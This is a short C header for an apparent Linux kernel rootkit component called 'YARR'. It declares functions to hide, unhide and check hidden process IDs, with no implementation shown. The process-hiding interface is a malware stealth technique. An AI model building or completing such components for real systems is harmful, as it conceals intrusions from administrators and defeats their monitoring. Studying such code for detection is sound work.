#ifndef __YARR_HIDEPID
#define __YARR_HIDEPID

#include <linux/types.h>

/**
 * Initializes the subsystem that implements process hiding. This function is
 * a singleton, it should be called just once.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int init_hidepid(void);

/**
 * Stops the hidepid subsystem, freeing all the resources taken. This function
 * is a singleton, should be called just once.
 *
 * @return: Zero on success, non-zero elsewhere.
 */
int stop_hidepid(void);

/**
 * Hides a pid in the system.
 *
 * @pid: The pid to hide.
 * @return: Zero on success, non-zero elsewhere.
 */
int hide_pid(pid_t pid);

/**
 * Stops hiding a pid.
 *
 * @pid: The pid to stop hiding, if the pid wasn't already hidden returns an
 * error.
 * @return: Zero on success, non-zero elsewhere.
 */
int stop_hide_pid(pid_t pid);

/**
 * Checks if a pid is already hidden.
 *
 * @pid: The pid to check for.
 * @return: Zero if the pid is not hidden, non-zero if the pi is hidden.
 */
int pid_is_hidden(pid_t pid);

#endif
